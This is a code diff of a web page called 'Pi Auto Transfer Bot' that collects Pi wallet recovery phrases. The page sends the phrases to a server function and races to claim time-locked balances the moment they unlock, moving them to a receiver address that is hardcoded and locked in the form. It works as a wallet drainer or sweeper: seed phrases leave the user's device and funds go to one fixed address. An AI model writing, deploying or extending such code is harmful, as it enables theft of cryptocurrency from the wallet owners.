@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pi Auto Transfer Bot - Professional</title>
     <style>
-        /* (CSS कोड बिल्कुल वैसा ही है जैसा पहले था, कोई बदलाव नहीं) */
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto+Mono&display=swap');
         :root {
             --slate-900: #0f172a; --slate-800: #1e293b; --slate-700: #334155;
@@ -21,13 +20,12 @@
             min-height: 100vh; padding: 24px; box-sizing: border-box;
         }
         .container { width: 100%; max-width: 500px; }
-        .header { text-align: center; margin-bottom: 24px; }
         .header h1 {
             font-size: 28px; font-weight: 700; margin: 0 0 8px 0;
             background: linear-gradient(to right, var(--purple-400), var(--pink-500));
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-align: center;
         }
-        .header p { margin: 0; color: var(--slate-300); }
+        .header p { margin: 0; color: var(--slate-300); text-align: center; margin-bottom: 24px;}
         .tabs { display: grid; grid-template-columns: 1fr 1fr; background-color: rgba(0,0,0,0.3); border: 1px solid var(--slate-700); border-radius: 8px; padding: 4px; }
         .tab-button {
             padding: 10px; border: none; background: transparent; color: var(--slate-300);
@@ -85,7 +83,7 @@
 </head>
 <body>
     <div class="container">
-        <div class="header"><h1>Pi Auto Transfer Bot - Professional</h1><p>Advanced tool for unlocking and transferring Pi with all options.</p></div>
+        <div class="header"><h1>Pi Auto Transfer Bot - Professional</h1><p>Predictive submission tool for time-locked Pi transfers.</p></div>
         <div class="tabs">
             <button id="tab-discover" class="tab-button active">Discover Locked Coins</button>
             <button id="tab-transfer" class="tab-button">Initiate Transfer</button>
@@ -105,130 +103,48 @@
             <div class="card">
                 <div class="card-header"><h2>Initiate Transfer</h2><p>Configure wallet phrase and Locked Balance ID for transfer.</p></div>
                 
-                <div class="form-group">
-                    <label for="operation-type">Operation Type</label>
-                    <select id="operation-type">
-                        <option value="claim_and_transfer">Unlock And Transfer</option>
-                        <option value="withdrawal">Withdrawal</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label for="fee-type">Deduct Transaction Fee From</label>
-                    <select id="fee-type">
-                        <option value="SPONSOR_PAYS">Sponsor Wallet</option>
-                        <option value="LOCKED_ACCOUNT_PAYS">Sender/Locked Wallet</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label for="fee-mechanism">Fee Mechanism</label>
-                    <select id="fee-mechanism">
-                        <option value="AUTOMATIC">Automatic (Fetches From Network)</option>
-                        <option value="SPEED_HIGH">Speed High Fees (10x Base)</option>
-                        <option value="CUSTOM">Custom</option>
-                    </select>
-                </div>
-                 <div id="custom-fee-group" class="form-group hidden">
-                    <label for="custom-fee">Custom Fee (Total for transaction, in stroops)</label>
-                    <input type="number" id="custom-fee" value="1000000">
-                    <span class="input-unit">stroops</span>
-                </div>
-                <div id="records-per-attempt-group" class="form-group">
-                    <label for="records-per-attempt">Operations Per Transaction (Records Per Attempt)</label>
-                    <input type="number" id="records-per-attempt" value="1" min="1">
-                </div>
+                <div class="form-group"><label for="operation-type">Operation Type</label><select id="operation-type"><option value="claim_and_transfer">Unlock And Transfer</option></select></div>
+                <div class="form-group"><label for="fee-type">Deduct Transaction Fee From</label><select id="fee-type"><option value="SPONSOR_PAYS">Sponsor Wallet</option><option value="LOCKED_ACCOUNT_PAYS">Sender/Locked Wallet</option></select></div>
+                <div class="form-group"><label for="fee-mechanism">Fee Mechanism</label><select id="fee-mechanism"><option value="AUTOMATIC">Automatic (Fetches From Network)</option><option value="SPEED_HIGH">Speed High Fees (10x Base)</option><option value="CUSTOM">Custom</option></select></div>
+                <div id="custom-fee-group" class="form-group hidden"><label for="custom-fee">Custom Total Fee (in stroops)</label><input type="number" id="custom-fee" value="1000000"><span class="input-unit">stroops</span></div>
+                <div id="records-per-attempt-group" class="form-group"><label for="records-per-attempt">Operations Per Transaction (Records Per Attempt)</label><input type="number" id="records-per-attempt" value="1" min="1"></div>
                 
                 <div class="form-group"><label id="sender-label" for="senderMnemonic">Locked Account Phrase</label><input type="password" id="senderMnemonic" placeholder="Enter locked account phrase"></div>
                 <div id="sponsor-group" class="form-group"><label for="sponsorMnemonic">Sponsor Wallet Phrase</label><input type="password" id="sponsorMnemonic" placeholder="Enter sponsor wallet Phrase"></div>
                 <div class="form-group"><label for="receiverAddress">Receiver Wallet Address</label><input type="text" id="receiverAddress" value="GC6W3TUI5AOWIUDXECX6NHAZOKMORN7ENTNOVIUROPIYFGNVWUIMK4M3" disabled></div>
+                <div id="locked-balance-group" class="form-group"><label for="claimableId">Locked Balance</label><select id="claimableId"></select><div id="no-locked-balance-msg" class="message-info" style="padding: 10px; margin-top: 8px; border-radius: 6px; font-size: 13px;">Please use the "Discover" tab first.</div></div>
+                <div class="form-group"><label for="unlockTimeInput">Unlock Time (UTC - ISO Format)</label><input type="text" id="unlockTimeInput" placeholder="2025-09-10T12:36:05Z"><small style="color: var(--slate-400); display: block; margin-top: 6px;">Start the bot 5-10 seconds BEFORE this time for best results.</small></div>
                 
-                <div id="locked-balance-group" class="form-group">
-                    <label for="claimableId">Locked Balance</label>
-                    <select id="claimableId"></select>
-                    <div id="no-locked-balance-msg" class="message-info" style="padding: 10px; margin-top: 8px; border-radius: 6px; font-size: 13px;">Please use the "Discover" tab first.</div>
-                </div>
-                
-                <div id="withdrawal-amount-group" class="form-group hidden">
-                    <label for="withdrawalAmount">Amount Per Transaction</label>
-                    <input type="number" id="withdrawalAmount" value="0.01">
-                </div>
-                
-                <div id="batch-size-group" class="form-group hidden">
-                     <label for="transactionCount">Transactions Per Batch</label>
-                    <input type="number" id="transactionCount" value="50" min="1" max="100">
-                </div>
-
-                <div class="form-group">
-                    <label for="max-attempts">Max Attempt Cycles (0 for infinite)</label>
-                    <input type="number" id="max-attempts" value="0" min="0">
-                </div>
-
-                <!-- Added unlock time input (UTC ISO) -->
-                <div class="form-group">
-                    <label for="unlockTimeInput">Unlock Time (UTC - ISO)</label>
-                    <input type="text" id="unlockTimeInput" placeholder="e.g. 2025-09-10T12:03:54.000Z">
-                    <small style="color: var(--slate-400); display: block; margin-top: 6px;">If set, the bot will wait and trigger exactly at this time (millisecond-precision sync).</small>
-                </div>
-
-                <div style="display: flex; gap: 10px; margin-top: 24px;">
-                    <button id="submitBtn"><span class="btn-text">Start Auto Retry</span></button>
-                    <button id="cancelBtn" class="cancel-btn hidden"><span class="btn-text">Cancel</span></button>
-                </div>
-
+                <div style="display: flex; gap: 10px; margin-top: 24px;"><button id="submitBtn"><span class="btn-text">Start Bot</span></button><button id="cancelBtn" class="cancel-btn hidden"><span class="btn-text">Cancel</span></button></div>
                 <div id="message-box" class="message-box hidden"></div>
-                <div id="attempts-container" class="hidden" style="margin-top: 24px;">
-                    <h3>Attempts Log:</h3>
-                    <p id="attempts-counter" style="font-size: 14px; color: var(--slate-400);"></p>
-                    <div id="attempts-box" class="attempts-box"></div>
-                </div>
+                <div id="attempts-container" class="hidden" style="margin-top: 24px;"><h3>Process Log:</h3><div id="attempts-box" class="attempts-box"></div></div>
             </div>
         </div>
     </div>
 
     <script>
         // --- Global State & Element References ---
-        let isProcessing = false;
-        let shouldStop = false;
-        let lockedBalancesCache = [];
-
+        let isProcessing = false; let shouldStop = false; let lockedBalancesCache = [];
         const elements = {
-            tabDiscover: document.getElementById('tab-discover'),
-            tabTransfer: document.getElementById('tab-transfer'),
-            contentDiscover: document.getElementById('content-discover'),
-            contentTransfer: document.getElementById('content-transfer'),
-            operationTypeSelect: document.getElementById('operation-type'),
-            feeTypeSelect: document.getElementById('fee-type'),
-            feeMechanismSelect: document.getElementById('fee-mechanism'),
-            customFeeGroup: document.getElementById('custom-fee-group'),
-            sponsorGroup: document.getElementById('sponsor-group'),
-            claimableIdSelect: document.getElementById('claimableId'),
-            noLockedBalanceMsg: document.getElementById('no-locked-balance-msg'),
-            discoverBtn: document.getElementById('discover-btn'),
-            discoverKeyphraseInput: document.getElementById('discover-keyphrase'),
-            lockedCoinsListEl: document.getElementById('locked-coins-list'),
-            discoverMessageEl: document.getElementById('discover-message'),
-            submitBtn: document.getElementById('submitBtn'),
-            cancelBtn: document.getElementById('cancelBtn'),
-            messageBox: document.getElementById('message-box'),
-            attemptsContainer: document.getElementById('attempts-container'),
-            attemptsBox: document.getElementById('attempts-box'),
-            attemptsCounter: document.getElementById('attempts-counter'),
-            senderMnemonicInput: document.getElementById('senderMnemonic'),
-            sponsorMnemonicInput: document.getElementById('sponsorMnemonic'),
-            receiverAddressInput: document.getElementById('receiverAddress'),
-            maxAttemptsInput: document.getElementById('max-attempts'),
-            customFeeInput: document.getElementById('custom-fee'),
-            recordsPerAttemptInput: document.getElementById('records-per-attempt'),
-            recordsPerAttemptGroup: document.getElementById('records-per-attempt-group'),
-            withdrawalAmountGroup: document.getElementById('withdrawal-amount-group'),
-            batchSizeGroup: document.getElementById('batch-size-group'),
-            senderLabel: document.getElementById('sender-label'),
+            tabDiscover: document.getElementById('tab-discover'), tabTransfer: document.getElementById('tab-transfer'),
+            contentDiscover: document.getElementById('content-discover'), contentTransfer: document.getElementById('content-transfer'),
+            operationTypeSelect: document.getElementById('operation-type'), feeTypeSelect: document.getElementById('fee-type'),
+            feeMechanismSelect: document.getElementById('fee-mechanism'), customFeeGroup: document.getElementById('custom-fee-group'),
+            customFeeInput: document.getElementById('custom-fee'), recordsPerAttemptInput: document.getElementById('records-per-attempt'),
+            sponsorGroup: document.getElementById('sponsor-group'), claimableIdSelect: document.getElementById('claimableId'),
+            noLockedBalanceMsg: document.getElementById('no-locked-balance-msg'), discoverBtn: document.getElementById('discover-btn'),
+            discoverKeyphraseInput: document.getElementById('discover-keyphrase'), lockedCoinsListEl: document.getElementById('locked-coins-list'),
+            discoverMessageEl: document.getElementById('discover-message'), submitBtn: document.getElementById('submitBtn'),
+            cancelBtn: document.getElementById('cancelBtn'), messageBox: document.getElementById('message-box'),
+            attemptsContainer: document.getElementById('attempts-container'), attemptsBox: document.getElementById('attempts-box'),
+            senderMnemonicInput: document.getElementById('senderMnemonic'), sponsorMnemonicInput: document.getElementById('sponsorMnemonic'),
+            receiverAddressInput: document.getElementById('receiverAddress'), senderLabel: document.getElementById('sender-label'),
             unlockTimeInput: document.getElementById('unlockTimeInput'),
         };
 
         // --- Event Listeners ---
         elements.tabDiscover.addEventListener('click', () => switchTab('discover'));
         elements.tabTransfer.addEventListener('click', () => switchTab('transfer'));
-        elements.operationTypeSelect.addEventListener('change', updateFormVisibility);
         elements.feeTypeSelect.addEventListener('change', updateFormVisibility);
         elements.feeMechanismSelect.addEventListener('change', updateFormVisibility);
         elements.discoverBtn.addEventListener('click', handleDiscover);
@@ -238,26 +154,13 @@
         // --- Core Functions ---
         function switchTab(tabName) {
             const isDiscover = tabName === 'discover';
-            elements.tabDiscover.classList.toggle('active', isDiscover);
-            elements.tabTransfer.classList.toggle('active', !isDiscover);
-            elements.contentDiscover.classList.toggle('active', isDiscover);
-            elements.contentTransfer.classList.toggle('active', !isDiscover);
+            elements.tabDiscover.classList.toggle('active', isDiscover); elements.tabTransfer.classList.toggle('active', !isDiscover);
+            elements.contentDiscover.classList.toggle('active', isDiscover); elements.contentTransfer.classList.toggle('active', !isDiscover);
         }
 
         function updateFormVisibility() {
-            const opType = elements.operationTypeSelect.value;
-            const feeType = elements.feeTypeSelect.value;
-            const feeMechanism = elements.feeMechanismSelect.value;
-            
-            elements.sponsorGroup.classList.toggle('hidden', feeType !== 'SPONSOR_PAYS');
-            elements.customFeeGroup.classList.toggle('hidden', feeMechanism !== 'CUSTOM');
-            elements.senderLabel.textContent = opType === 'claim_and_transfer' ? "Locked Account Phrase" : "Sender Wallet Phrase";
-            
-            const isWithdrawal = opType === 'withdrawal';
-            elements.lockedBalanceGroup.classList.toggle('hidden', isWithdrawal);
-            elements.recordsPerAttemptGroup.classList.toggle('hidden', isWithdrawal);
-            elements.withdrawalAmountGroup.classList.toggle('hidden', !isWithdrawal);
-            elements.batchSizeGroup.classList.toggle('hidden', !isWithdrawal);
+            elements.sponsorGroup.classList.toggle('hidden', elements.feeTypeSelect.value !== 'SPONSOR_PAYS');
+            elements.customFeeGroup.classList.toggle('hidden', elements.feeMechanismSelect.value !== 'CUSTOM');
         }
 
         async function handleDiscover() {
@@ -266,23 +169,18 @@
             setButtonLoading(elements.discoverBtn, true);
             showMessage(elements.discoverMessageEl, "Scanning wallet...", 'info');
             elements.lockedCoinsListEl.style.display = 'none';
-
             try {
                 const response = await fetch('/.netlify/functions/getClaimableBalances', {
                     method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ mnemonic })
                 });
                 const result = await response.json();
                 if (!response.ok || !result.success) throw new Error(result.error || `Server error ${response.status}`);
-                
                 lockedBalancesCache = result.balances || [];
                 displayLockedCoins(lockedBalancesCache);
                 updateClaimableBalanceDropdown(lockedBalancesCache);
                 showMessage(elements.discoverMessageEl, `Found ${lockedBalancesCache.length} locked balance(s).`, 'success');
-            } catch (err) {
-                showMessage(elements.discoverMessageEl, `Error: ${err.message}`, 'error');
-            } finally {
-                setButtonLoading(elements.discoverBtn, false);
-            }
+            } catch (err) { showMessage(elements.discoverMessageEl, `Error: ${err.message}`, 'error');
+            } finally { setButtonLoading(elements.discoverBtn, false); }
         }
 
         function displayLockedCoins(balances) {
@@ -315,213 +213,85 @@
                     option.textContent = `Balance #${index + 1} (${balance.amount} PI)`;
                     elements.claimableIdSelect.appendChild(option);
                 });
-                elements.claimableIdSelect.classList.remove('hidden');
-                elements.noLockedBalanceMsg.classList.add('hidden');
+                elements.claimableIdSelect.classList.remove('hidden'); elements.noLockedBalanceMsg.classList.add('hidden');
             } else {
-                elements.claimableIdSelect.classList.add('hidden');
-                elements.noLockedBalanceMsg.classList.remove('hidden');
+                elements.claimableIdSelect.classList.add('hidden'); elements.noLockedBalanceMsg.classList.remove('hidden');
             }
-        }
-
-        // --- Time sync and scheduler helpers ---
-        async function syncServerTime() {
-            // returns drift = serverTimeMs - localNowMs
-            try {
-                const r = await fetch('https://worldtimeapi.org/api/timezone/etc/utc', { cache: 'no-store' });
-                if (!r.ok) throw new Error('time API failed');
-                const j = await r.json();
-                const serverMs = Date.parse(j.utc_datetime);
-                return serverMs - Date.now();
-            } catch (e) {
-                console.warn('Time sync failed, using local clock:', e);
-                return 0;
-            }
-        }
-
-        let scheduledTimer = null;
-
-        async function scheduleTriggerAt(unlockIso) {
-            // cancel any previous schedule
-            if (scheduledTimer) { clearTimeout(scheduledTimer); scheduledTimer = null; }
-            const drift = await syncServerTime(); // ms
-            const unlockMs = Date.parse(unlockIso);
-            if (isNaN(unlockMs)) {
-                showMessage(elements.messageBox, 'Invalid unlock time format. Use ISO UTC (e.g. 2025-09-10T12:03:54.000Z)', 'error');
-                updateUIAfterStop(false);
-                return;
-            }
-            const localTarget = unlockMs - drift;
-            const now = Date.now();
-            const msToTarget = localTarget - now;
-
-            if (msToTarget <= 0) {
-                // time already passed or within immediate window — start immediately
-                showMessage(elements.messageBox, 'Unlock time is now or already passed. Starting immediately.', 'info');
-                runLoop(); // start immediately (first iteration)
-                return;
-            }
-
-            showMessage(elements.messageBox, `Scheduled to trigger at exact time. Waiting ${Math.ceil(msToTarget)} ms...`, 'info');
-
-            // Pre-warm: set a timeout to wake a little before, then busy-wait in final ms for better precision
-            const preMs = Math.max(0, msToTarget - 300); // wake 300ms before
-            scheduledTimer = setTimeout(async () => {
-                // final sync and busy-wait
-                const finalDrift = await syncServerTime();
-                const finalLocalTarget = unlockMs - finalDrift;
-                const remaining = finalLocalTarget - Date.now();
-                if (remaining > 5) {
-                    // sleep until near target
-                    setTimeout(() => {
-                        // small busy-wait loop for final ms precision (minimal)
-                        const start = Date.now();
-                        while (Date.now() < finalLocalTarget) { /* spin */ }
-                        runLoop(); // trigger at exact millisecond
-                    }, Math.max(0, remaining - 3));
-                } else {
-                    // already within 5ms, trigger now
-                    runLoop();
-                }
-            }, preMs);
         }
 
         function startProcess() {
-            shouldStop = false;
-            isProcessing = true;
-            updateUIAfterStart();
-
-            const unlockIso = elements.unlockTimeInput.value && elements.unlockTimeInput.value.trim();
-            if (unlockIso) {
-                // schedule exact trigger
-                scheduleTriggerAt(unlockIso);
-            } else {
-                // no unlock time provided, start immediately (existing behavior)
-                runLoop();
-            }
+            if (isProcessing) return;
+            isProcessing = true; shouldStop = false;
+            updateUIAfterStart(); executeTransferRequest();
         }
 
         function stopProcess() {
             shouldStop = true;
-            if (scheduledTimer) { clearTimeout(scheduledTimer); scheduledTimer = null; }
-            showMessage(elements.messageBox, "Cancelling...", 'error');
+            showMessage(elements.messageBox, "Stop signal sent. If process is on server, it may complete.", 'error');
+            updateUIAfterStop(false); isProcessing = false;
         }
 
-        // --- MODIFIED runLoop (only small injection: removeSponsorship flag) ---
-        async function runLoop() {
-            const maxAttempts = parseInt(elements.maxAttemptsInput.value, 10);
-            const isInfinite = maxAttempts === 0;
-            let attempt = 1;
-            let delay = 200; // Start with the normal delay
-
-            while ((isInfinite || attempt <= maxAttempts) && !shouldStop) {
-                elements.attemptsCounter.textContent = `Attempt Cycle #${attempt} of ${isInfinite ? '∞' : maxAttempts}`;
+        async function executeTransferRequest() {
+            if (shouldStop) { isProcessing = false; return; }
+            logResult({ type: 'info', message: 'Command sent. Server is now starting the race...' });
+            try {
+                const selectedClaimableId = elements.claimableIdSelect.value;
+                const unlockTime = elements.unlockTimeInput.value.trim();
+                if (!selectedClaimableId) throw new Error("No locked balance selected.");
+                if (!unlockTime) throw new Error("Unlock Time is required for predictive submission.");
                 
-                const opType = elements.operationTypeSelect.value;
-                let body, endpoint;
-
-                const commonBody = {
+                const body = {
+                    operation: elements.operationTypeSelect.value,
                     senderMnemonic: elements.senderMnemonicInput.value,
-                    feeType: elements.feeTypeSelect.value,
                     sponsorMnemonic: elements.sponsorMnemonicInput.value,
                     receiverAddress: elements.receiverAddressInput.value,
+                    claimableId: selectedClaimableId,
+                    feeType: elements.feeTypeSelect.value,
                     feeMechanism: elements.feeMechanismSelect.value,
                     customFee: elements.customFeeInput.value,
+                    recordsPerAttempt: elements.recordsPerAttemptInput.value,
+                    amount: lockedBalancesCache.find(b => b.id === selectedClaimableId)?.amount || '0',
+                    unlockTime: unlockTime || null,
                 };
                 
-                if (opType === 'withdrawal') {
-                    endpoint = '/.netlify/functions/submitTransaction';
-                    body = {
-                        ...commonBody,
-                        amount: document.getElementById('withdrawalAmount').value,
-                        count: parseInt(document.getElementById('transactionCount').value, 10)
-                    };
-                } else { // claim_and_transfer
-                    endpoint = '/.netlify/functions/submitTransaction';
-                    body = {
-                        ...commonBody,
-                        recordsPerAttempt: elements.recordsPerAttemptInput.value,
-                        claimableId: elements.claimableIdSelect.value,
-                        amount: lockedBalancesCache.find(b => b.id === elements.claimableIdSelect.value)?.amount || '0',
-                        // === INJECTED FLAG ===
-                        removeSponsorship: true
-                    };
-                    if (!body.claimableId) {
-                        showMessage(elements.messageBox, "No locked balance selected.", 'error');
-                        shouldStop = true; 
-                        break;
-                    }
-                }
-
-                try {
-                    const response = await fetch(endpoint, {
-                        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body)
-                    });
-                    
-                    if (response.status === 429) {
-                        logAttempt(attempt, { success: false, error: "Rate limited (429). Waiting 10s..." }, opType);
-                        delay = 10000; // Set a 10-second delay for rate limiting
-                    } else if (!response.ok) {
-                        // Handle other server errors (like 500, 502, 400 etc.)
-                        const errorText = await response.text();
-                        logAttempt(attempt, { success: false, error: `Server Error (${response.status}): ${errorText.substring(0, 100)}` }, opType);
-                        delay = 5000; // Wait 5 seconds after a server error
-                    } else {
-                        // Handle successful response
-                        const result = await response.json();
-                        logAttempt(attempt, result, opType);
-                        delay = 200; // Reset to normal delay on success
-                    }
-
-                } catch (err) {
-                    // Handle network errors (e.g., failed to fetch) or other script errors
-                    logAttempt(attempt, { success: false, error: `Network/Script Error: ${err.toString()}` }, opType);
-                    delay = 5000; // Wait 5 seconds after a network/script error
-                }
+                const response = await fetch('/.netlify/functions/submitTransaction', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body)
+                });
                 
-                attempt++;
-                await new Promise(resolve => setTimeout(resolve, delay)); // Use the dynamic delay
-            }
-            
-            isProcessing = false;
-            updateUIAfterStop(false);
+                const result = await response.json();
+                if (!response.ok || !result.success) throw new Error(result.error || `Server Error (${response.status})`);
+                logResult({ type: 'success', data: result }); updateUIAfterStop(true);
+            } catch (err) {
+                logResult({ type: 'error', message: err.message }); updateUIAfterStop(false);
+            } finally { isProcessing = false; }
         }
         
         function updateUIAfterStart() {
-            elements.submitBtn.classList.add('hidden');
-            elements.cancelBtn.classList.remove('hidden');
-            elements.attemptsContainer.classList.remove('hidden');
-            elements.messageBox.style.display = 'none';
+            elements.submitBtn.classList.add('hidden'); elements.cancelBtn.classList.remove('hidden');
+            elements.attemptsContainer.classList.remove('hidden'); elements.messageBox.style.display = 'none';
             elements.attemptsBox.innerHTML = '';
         }
 
         function updateUIAfterStop(isSuccess) {
-            elements.submitBtn.classList.remove('hidden');
-            elements.cancelBtn.classList.add('hidden');
-            if(isSuccess) return;
-            if (shouldStop) {
-                showMessage(elements.messageBox, "Process stopped by user.", 'error');
-            } else {
-                showMessage(elements.messageBox, "Max attempts reached or process finished.", 'info');
-            }
+            elements.submitBtn.classList.remove('hidden'); elements.cancelBtn.classList.add('hidden');
+            if (isSuccess) { showMessage(elements.messageBox, "Process completed successfully!", 'success');
+            } else { showMessage(elements.messageBox, shouldStop ? "Process stopped by user." : "Process failed. Check logs.", 'error'); }
         }
         
-        function logAttempt(attemptNum, result, opType) {
-            const logEntry = document.createElement('p');
-            // Use the new, more descriptive error message if available
-            const errorMessage = result.error || 'Unknown error';
-
-            if (result.success) {
-                logEntry.className = 'log-success';
-                let msg = `Attempt #${attemptNum}: SUCCESS - `;
-                if (opType === 'withdrawal') {
-                     msg += `${result.successful_transactions?.length || 0} sent.`;
-                } else {
-                     msg += `Hash: ${result.response?.hash?.substring(0, 10) || 'N/A'}...`;
-                }
-                logEntry.textContent = msg;
-            } else {
-                logEntry.className = 'log-fail';
-                logEntry.textContent = `Attempt #${attemptNum}: FAILED - ${errorMessage}`;
+        function logResult(result) {
+            const logEntry = document.createElement('p'); const now = new Date().toLocaleTimeString();
+            switch (result.type) {
+                case 'success':
+                    logEntry.className = 'log-success';
+                    const hash = result.data?.response?.hash?.substring(0, 10) || 'N/A';
+                    logEntry.textContent = `[${now}] ✅ SUCCESS! Transaction confirmed. Hash: ${hash}...`;
+                    break;
+                case 'error':
+                    logEntry.className = 'log-fail'; logEntry.textContent = `[${now}] ❌ FAILED: ${result.message}`;
+                    break;
+                default:
+                    logEntry.style.color = 'var(--slate-400)'; logEntry.textContent = `[${now}] ⏳ INFO: ${result.message}`;
+                    break;
             }
             elements.attemptsBox.prepend(logEntry);
         }
@@ -529,24 +299,17 @@
         function setButtonLoading(button, isLoading) {
             const btnText = button.querySelector('.btn-text');
             if (isLoading) {
-                button.disabled = true;
-                if (btnText) btnText.style.display = 'none';
+                button.disabled = true; if(btnText) btnText.style.display = 'none';
                 if (!button.querySelector('.spinner')) {
-                    const spinner = document.createElement('div');
-                    spinner.className = 'spinner';
-                    button.prepend(spinner);
+                    const spinner = document.createElement('div'); spinner.className = 'spinner'; button.prepend(spinner);
                 }
             } else {
-                button.disabled = false;
-                if (btnText) btnText.style.display = 'inline';
+                button.disabled = false; if(btnText) btnText.style.display = 'inline';
                 button.querySelector('.spinner')?.remove();
             }
         }
-        
         function showMessage(element, text, type) {
-            element.textContent = text;
-            element.className = `message-box message-${type}`;
-            element.style.display = 'block';
+            element.textContent = text; element.className = `message-box message-${type}`; element.style.display = 'block';
         }
 
         // Initial UI setup
